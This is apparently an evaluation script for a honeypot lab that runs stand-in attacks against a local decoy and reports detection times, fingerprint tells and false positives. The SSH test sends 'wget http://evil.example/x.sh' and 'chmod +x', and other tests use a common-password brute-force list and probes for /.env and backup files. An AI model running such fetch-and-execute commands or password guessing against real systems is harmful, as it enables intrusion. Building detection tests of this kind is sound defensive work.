#!/usr/bin/env python3
"""Evidence harness: attack the RUNNING stack and report what actually happened. Run:  python eval/run_eval.py

Rules of this harness
  * Targets 127.0.0.1 only (the lab stack from docker-compose / run_local.py). Never point it at anything you do not own.
  * Standard library only; asyncssh is optional (SSH rows are skipped cleanly without it); external tools are optional.
  * It reports misses, skipped rows and fingerprint tells exactly as measured. Numbers are for THIS lab and THESE
    stand-in tools, not claims about real-world detection rates.
Outputs: eval/results.json and eval/RESULTS.md
"""
import argparse
import asyncio
import hashlib
import json
import os
import platform
import re
import shutil
import socket
import statistics
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
API = os.environ.get("API", "http://127.0.0.1:8000")
WEB = os.environ.get("WEB", "http://127.0.0.1:8081")
SSH_PORT = int(os.environ.get("SSH_PORT", "2222"))
LEVELS = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
POLL = 0.025


# ------------------------------------------------------------------ http helpers
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def http(url, method="GET", data=None, headers=None, timeout=8):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    t = time.perf_counter()
    try:
        r = _OPENER.open(req, timeout=timeout)
        return r.status, dict(r.headers), r.read().decode("utf-8", "replace"), time.perf_counter() - t
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace"), time.perf_counter() - t


def api_json(path):
    s, _, b, _ = http(API + path)
    return json.loads(b) if s == 200 else None


def web_sid(ip, ua):
    return "web-" + hashlib.sha1(f"{ip}|{ua}".encode()).hexdigest()[:10]


def fresh_ip(counter=[0]):
    counter[0] += 1
    return f"203.0.113.{(os.getpid() + counter[0] * 7) % 250 + 2}"


def web(path, ip, ua, data=None, url=None):
    h = {"User-Agent": ua, "X-Forwarded-For": ip}
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    return http(url or (WEB + path), "POST" if data is not None else "GET", data, h)


# ------------------------------------------------------------------ attack stand-ins
WORDLIST = ["admin", "login", "wp-admin", "wp-login.php", "phpmyadmin", "backup", "backup.zip", "db.sql", "config.php",
            "config.bak", ".git/HEAD", ".svn/entries", "server-status", "console", "api", "api/v1/users", "uploads",
            "test", "dev", "old", "staging", "robots.txt", "sitemap.xml", "admin.php", "administrator", "cgi-bin/",
            "manager/html", "jenkins", "solr", "actuator/health"]


def a_recon(ip):
    ua = "gobuster/3.6"
    for p in WORDLIST:
        web("/" + p, ip, ua)
    return web_sid(ip, ua)


def a_bruteforce(ip):
    ua = "Mozilla/5.0 (compatible; Hydra)"
    for pw in ["123456", "password", "qwerty", "letmein2", "root", "toor", "admin1", "welcome", "dragon", "monkey", "abc123", "iloveyou"]:
        web("/login", ip, ua, data=urllib.parse.urlencode({"username": "admin", "password": pw}).encode())
    return web_sid(ip, ua)


def a_sensitive(ip):
    ua = "curl/8.5.0"
    web("/.env", ip, ua)
    web("/backup.sql", ip, ua)
    return web_sid(ip, ua)


def a_chain(ip):
    ua = "python-requests/2.31.0"
    web("/login", ip, ua, data=urllib.parse.urlencode({"username": "admin", "password": "admin123"}).encode())
    web("/admin", ip, ua)
    _, _, body, _ = web("/download/passwords_backup.txt", ip, ua)
    m = re.search(r"/c/([A-Za-z0-9_-]{8,64})", body)
    if m:  # the "thief" follows the bait link. A real thief opens it seconds-to-hours later; the decoy registers the
        time.sleep(0.5)  # canary in the background, so an instant follow would race that registration (a harness artifact)
        http(API + "/c/" + m.group(1), headers={"User-Agent": ua, "X-Forwarded-For": ip})
    return web_sid(ip, ua)


def a_low_slow(ip):
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0 Safari/537.36"
    web("/.env", ip, ua)
    time.sleep(3)
    web("/backup.sql", ip, ua)
    return web_sid(ip, ua)


def a_benign(ip):
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0 Safari/537.36"
    web("/", ip, ua)
    web("/login", ip, ua)
    web("/favicon.ico", ip, ua)
    return web_sid(ip, ua)


WEB_ACTIONS = [
    # name, function, runs, expected minimum level for "detected" (None = must stay LOW), description
    ("web_recon_scan", a_recon, 5, "MEDIUM", "30-path wordlist scan (gobuster-style)"),
    ("web_bruteforce", a_bruteforce, 5, "HIGH", "12 password guesses (hydra-style)"),
    ("web_sensitive_files", a_sensitive, 5, "MEDIUM", "GET /.env and /backup.sql"),
    ("web_full_chain", a_chain, 5, "CRITICAL", "login, bait download, follow canary link"),
    ("web_low_and_slow", a_low_slow, 2, "MEDIUM", "2 sensitive probes 3 s apart, browser user agent"),
    ("benign_browse", a_benign, 5, None, "ordinary page load (false-positive check)"),
]


def run_web_action(name, fn, runs, expect, desc):
    rows = []
    for _ in range(runs):
        ip = fresh_ip()
        box = {}
        t0 = time.perf_counter()

        def go():
            box["sid"] = fn(ip)
            box["done"] = time.perf_counter() - t0

        th = threading.Thread(target=go)
        th.start()
        first = {}
        sid = None
        while th.is_alive() or "late" not in box:
            if not th.is_alive():
                box["late"] = True  # one last pass after the action finished
            sid = box.get("sid") or sid
            if sid:
                d = api_json("/sessions/" + sid)
                if d:
                    lv = LEVELS.index(d["session"]["risk_level"])
                    for i in range(1, lv + 1):
                        first.setdefault(LEVELS[i], time.perf_counter() - t0)
            time.sleep(POLL)
        time.sleep(0.4)
        d = api_json("/sessions/" + box["sid"]) or {}
        s = d.get("session", {})
        final = s.get("risk_level", "NONE")
        need = LEVELS.index(expect) if expect else None
        detected = (LEVELS.index(final) >= need) if expect else (final in ("LOW", "NONE"))
        alert_lvl = expect or "MEDIUM"
        rows.append({
            "final_level": final, "score": s.get("risk_score"), "events": s.get("event_count"),
            "detected": bool(detected),
            "t_first_medium_s": first.get("MEDIUM"), "t_expected_level_s": first.get(alert_lvl),
            "action_duration_s": round(box["done"], 2),
            "behaviour": (d.get("behaviour") or {}).get("class"),
            "techniques": len(d.get("techniques", [])),
        })
    return summarize(name, desc, expect, rows)


def summarize(name, desc, expect, rows):
    det = sum(r["detected"] for r in rows)
    tt = [r["t_expected_level_s"] for r in rows if r["t_expected_level_s"] is not None]
    return {
        "name": name, "description": desc, "expected_min_level": expect or "stay LOW",
        "runs": len(rows), "detected": det,
        "levels": sorted({r["final_level"] for r in rows}),
        "median_time_to_expected_s": round(statistics.median(tt), 3) if tt else None,
        "p95_time_to_expected_s": round(sorted(tt)[max(0, int(round(0.95 * (len(tt) - 1))))], 3) if tt else None,
        "behaviour_classes": sorted({str(r["behaviour"]) for r in rows}),
        "median_techniques": statistics.median([r["techniques"] for r in rows]),
        "rows": rows,
    }


# ------------------------------------------------------------------ SSH
def ssh_available():
    try:
        import asyncssh  # noqa: F401
        return True
    except ImportError:
        return False


async def _ssh_connect(cmds, delay=0.0):
    import asyncssh
    passwords = iter(["admin", "Winter2024!"])

    class C(asyncssh.SSHClient):
        def password_auth_requested(self):
            return next(passwords, None)

    conn = await asyncssh.connect("127.0.0.1", SSH_PORT, username="admin", client_factory=C, known_hosts=None, public_key_auth=False)
    out, lat = [], []
    for c in cmds:
        t = time.perf_counter()
        r = await conn.run(c, check=False)
        lat.append(time.perf_counter() - t)
        out.append(r.stdout or "")
        if delay:
            await asyncio.sleep(delay)
    conn.close()
    return out, lat


def ssh_sessions():
    return {s["id"]: s for s in (api_json("/sessions") or []) if s["service"] == "ssh"}


def run_ssh_action(runs=3):
    cmds = ["uname -a", "ls", "cat passwords_backup.txt", "wget http://evil.example/x.sh", "chmod +x x.sh"]
    rows = []
    for _ in range(runs):
        before = set(ssh_sessions())
        t0 = time.perf_counter()
        holder = {}
        def go():
            asyncio.run(_ssh_connect(cmds))
            holder["done"] = time.perf_counter() - t0

        th = threading.Thread(target=go)
        th.start()
        first, sid = {}, None
        while th.is_alive():
            new = [s for i, s in ssh_sessions().items() if i not in before]
            if new:
                sid = new[0]["id"]
                lv = LEVELS.index(new[0]["risk_level"])
                for i in range(1, lv + 1):
                    first.setdefault(LEVELS[i], time.perf_counter() - t0)
            time.sleep(POLL)
        time.sleep(0.5)
        new = [i for i in ssh_sessions() if i not in before]
        sid = new[0] if new else sid
        d = api_json("/sessions/" + sid) if sid else {}
        s = (d or {}).get("session", {})
        final = s.get("risk_level", "NONE")
        rows.append({"final_level": final, "score": s.get("risk_score"), "events": s.get("event_count"),
                     "detected": final in ("HIGH", "CRITICAL"), "t_first_medium_s": first.get("MEDIUM"),
                     "t_expected_level_s": first.get("HIGH"), "action_duration_s": round(holder.get("done", 0), 2),
                     "behaviour": ((d or {}).get("behaviour") or {}).get("class"),
                     "techniques": len((d or {}).get("techniques", []))})
    return summarize("ssh_session", "SSH login on 2nd try, 5 commands incl. wget/chmod, reads bait file", "HIGH", rows)


# ------------------------------------------------------------------ adaptivity + fingerprint checks
def check_adaptivity(n=6):
    if not ssh_available():
        return {"name": "adaptivity", "status": "skipped", "note": "asyncssh not installed"}
    hosts, kernels = [], []
    for _ in range(n):
        out, _ = asyncio.run(_ssh_connect(["hostname", "uname -r"]))
        hosts.append(out[0].strip())
        kernels.append(out[1].strip())
    return {"name": "adaptivity", "status": "ok", "sessions": n, "distinct_hostnames": len(set(hosts)), "hostnames": hosts,
            "distinct_kernels": len(set(kernels)),
            "verdict": "pass" if len(set(hosts)) > 1 else "FLAGGED: every session saw the same machine (static decoy)"}


def check_ssh_banner():
    try:
        s = socket.create_connection(("127.0.0.1", SSH_PORT), timeout=4)
        banner = s.recv(255).decode(errors="replace").strip()
        s.close()
    except OSError as e:
        return {"name": "ssh_banner_vs_os", "status": "skipped", "note": str(e)}
    ok = bool(re.search(r"OpenSSH_8\.2p1 Ubuntu", banner))
    return {"name": "ssh_banner_vs_os", "status": "ok", "banner": banner,
            "verdict": "pass: OpenSSH 8.2p1 matches the claimed Ubuntu 20.04" if ok else "FLAGGED: banner does not match the claimed OS"}


def check_ssh_host_key_algs():
    if not ssh_available():
        return {"name": "ssh_host_key_algorithms", "status": "skipped", "note": "asyncssh not installed"}
    import asyncssh
    results = {}

    async def probe(alg):
        try:
            c = await asyncssh.connect("127.0.0.1", SSH_PORT, username="x", password="x", known_hosts=None,
                                       server_host_key_algs=[alg], public_key_auth=False, login_timeout=6)
            c.close()
            return True
        except asyncssh.KeyExchangeFailed:
            return False
        except Exception:
            return True  # negotiation worked; auth failure is irrelevant here

    for alg in ["ssh-ed25519", "ecdsa-sha2-nistp256", "rsa-sha2-512"]:
        results[alg] = asyncio.run(probe(alg))
    flagged = not (results["ssh-ed25519"] and results["ecdsa-sha2-nistp256"])
    return {"name": "ssh_host_key_algorithms", "status": "ok", "offered": results,
            "verdict": ("FLAGGED: a stock OpenSSH 8.2 server on Ubuntu offers ed25519 and ecdsa host keys; this one does not"
                        if flagged else "pass: host key algorithms resemble stock OpenSSH")}


def check_http_error_pages():
    """Frameworks leak through error pages. The Server header claims Apache; the 405/400 bodies must match."""
    s404, h, b404, _ = http(WEB + "/definitely-missing-page")
    s405, _, b405, _ = http(WEB + "/login", "DELETE")
    sv = h.get("Server", "")
    tells = []
    if not sv.startswith("Apache"):
        tells.append(f"Server header is '{sv}'")
    if re.search(r"werkzeug|flask|waitress|Method Not Allowed</title>", b405, re.I) or "<!doctype html>" in b405.lower():
        tells.append("405 page is the framework's own format, not Apache's")
    if s405 not in (405, 403):
        tells.append(f"DELETE /login returned {s405}")
    return {"name": "http_error_pages", "status": "ok", "server_header": sv, "status_404": s404, "status_405": s405,
            "tells": tells, "verdict": "pass" if not tells else "FLAGGED: " + "; ".join(tells)}


def check_http_timing(n=30):
    lat = [http(WEB + "/login")[3] * 1000 for _ in range(n)]
    return {"name": "http_response_timing_ms", "status": "ok", "samples": n,
            "median": round(statistics.median(lat), 2), "p95": round(sorted(lat)[int(0.95 * (n - 1))], 2),
            "stdev": round(statistics.pstdev(lat), 2),
            "verdict": "informational (a lab loopback measurement; says nothing about WAN behaviour)"}


def check_ssh_command_timing(n=15):
    if not ssh_available():
        return {"name": "ssh_command_timing_ms", "status": "skipped", "note": "asyncssh not installed"}
    _, lat = asyncio.run(_ssh_connect(["ls"] * n))
    ms = [x * 1000 for x in lat]
    sd = statistics.pstdev(ms)
    return {"name": "ssh_command_timing_ms", "status": "ok", "samples": n, "min": round(min(ms), 1), "max": round(max(ms), 1),
            "stdev": round(sd, 1),
            "verdict": "pass: response times vary like a real host" if sd >= 15 else "FLAGGED: near-identical instant replies"}


# ------------------------------------------------------------------ external tools (optional)
EXTERNAL = {
    "nmap": ["nmap", "-sV", "-p", "8081,2222", "127.0.0.1"],
    "ssh-audit": ["ssh-audit", f"127.0.0.1:{SSH_PORT}"],
    "nikto": ["nikto", "-h", WEB, "-maxtime", "30s"],
}


def run_external():
    rows = []
    for tool, cmd in EXTERNAL.items():
        path = shutil.which(tool)
        if not path:
            rows.append({"tool": tool, "status": "skipped (not installed)"})
            continue
        before = {s["id"] for s in (api_json("/sessions") or [])}
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            out = (p.stdout or p.stderr)[-600:]
            code = p.returncode
        except Exception as e:
            out, code = str(e), -1
        time.sleep(0.8)
        new = [s for s in (api_json("/sessions") or []) if s["id"] not in before]
        rows.append({"tool": tool, "status": "ran", "exit": code, "new_sessions": len(new),
                     "max_level": max((s["risk_level"] for s in new), key=LEVELS.index, default="none"),
                     "output_tail": out})
    return rows


# ------------------------------------------------------------------ report
def git_rev():
    try:
        return subprocess.run(["git", "rev-parse", "--short", "HEAD"], capture_output=True, text=True, cwd=HERE).stdout.strip()
    except Exception:
        return "unknown"


def write_report(res):
    L = []
    a = L.append
    a("# Evidence report (generated)\n")
    a(f"Generated {res['generated']} on {res['environment']['platform']}, Python {res['environment']['python']}, commit `{res['environment']['commit']}`.\n")
    a("**Scope and honesty:** lab stack on `127.0.0.1`, stand-in attack tools written in this repo (not the real gobuster/hydra), "
      "unique source IP per run via `X-Forwarded-For` (demo-only setting). Loopback timings say nothing about real networks. "
      "Misses and fingerprint tells are reported as measured.\n")
    a("## 1. Detection coverage\n")
    a("| Action | Runs | Detected | Expected | Final levels | Median time to expected level | p95 | Behaviour class |")
    a("|---|---|---|---|---|---|---|---|")
    for r in res["actions"]:
        t = "n/a" if r["median_time_to_expected_s"] is None else f"{r['median_time_to_expected_s'] * 1000:.0f} ms"
        p = "n/a" if r["p95_time_to_expected_s"] is None else f"{r['p95_time_to_expected_s'] * 1000:.0f} ms"
        a(f"| {r['name']} | {r['runs']} | {r['detected']}/{r['runs']} | {r['expected_min_level']} | {', '.join(r['levels'])} | {t} | {p} | {', '.join(r['behaviour_classes'])} |")
    a("\nTime to expected level = from the first request of the action until the dashboard API first reported that level "
      "(includes ~25 ms polling and HTTP overhead). 'Detected' means the session reached the expected level; "
      "for `benign_browse` it means the session stayed LOW.\n")
    fp = next((r for r in res["actions"] if r["name"] == "benign_browse"), None)
    if fp:
        a(f"**False positives on ordinary browsing:** {fp['runs'] - fp['detected']} of {fp['runs']} benign page loads reached MEDIUM or higher. "
          "Caveat: a decoy has no legitimate users, so any touch is suspicious by design; this only shows a normal page load is not scored as an attack.\n")
    a("## 2. Realism and fingerprint checks\n")
    a("| Check | Result |")
    a("|---|---|")
    for c in res["checks"]:
        a(f"| {c['name']} | {c.get('verdict', c.get('note', c.get('status')))} |")
    a("\n## 3. External tools\n")
    a("| Tool | Status | Notes |")
    a("|---|---|---|")
    for e in res["external"]:
        note = f"exit {e['exit']}, new sessions {e['new_sessions']}, max level {e['max_level']}" if e["status"] == "ran" else ""
        a(f"| {e['tool']} | {e['status']} | {note} |")
    a("\nRows marked skipped were not run, so nothing is claimed about them.\n")
    a("## 4. What this does NOT show\n")
    a("- Detection of real attackers, or of attackers who never touch a decoy.")
    a("- Resistance to a skilled human or to scanners not listed above. Passing these checks is not proof the decoy is undetectable.")
    a("- Anything about performance over a real network.")
    with open(os.path.join(HERE, "RESULTS.md"), "w", encoding="utf-8") as f:
        f.write("\n".join(L) + "\n")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true", help="1 run per action, skip the slow low-and-slow row")
    ap.add_argument("--out", default=HERE)
    args = ap.parse_args()
    if not api_json("/health"):
        sys.exit(f"api not reachable at {API}. Start the stack first (docker compose up -d  or  python run_local.py).")
    actions = []
    for name, fn, runs, expect, desc in WEB_ACTIONS:
        if args.quick and name == "web_low_and_slow":
            continue
        print(f"[eval] {name} x{1 if args.quick else runs}", flush=True)
        actions.append(run_web_action(name, fn, 1 if args.quick else runs, expect, desc))
    if ssh_available():
        print("[eval] ssh_session", flush=True)
        actions.append(run_ssh_action(1 if args.quick else 3))
    else:
        actions.append({"name": "ssh_session", "description": "skipped: asyncssh not installed", "expected_min_level": "HIGH", "runs": 0,
                        "detected": 0, "levels": [], "median_time_to_expected_s": None, "p95_time_to_expected_s": None,
                        "behaviour_classes": [], "median_techniques": 0, "rows": []})
    print("[eval] fingerprint checks", flush=True)
    checks = [check_adaptivity(), check_ssh_banner(), check_ssh_host_key_algs(), check_http_error_pages(),
              check_http_timing(), check_ssh_command_timing()]
    print("[eval] external tools", flush=True)
    res = {"generated": time.strftime("%Y-%m-%d %H:%M:%S"), "environment": {
        "platform": platform.platform(), "python": platform.python_version(), "commit": git_rev(),
        "api": API, "web": WEB, "ssh_port": SSH_PORT}, "actions": actions, "checks": checks, "external": run_external()}
    os.makedirs(args.out, exist_ok=True)
    with open(os.path.join(args.out, "results.json"), "w", encoding="utf-8") as f:
        json.dump(res, f, indent=2)
    write_report(res)
    print("[eval] wrote eval/results.json and eval/RESULTS.md")
    return 0


if __name__ == "__main__":
    sys.exit(main())
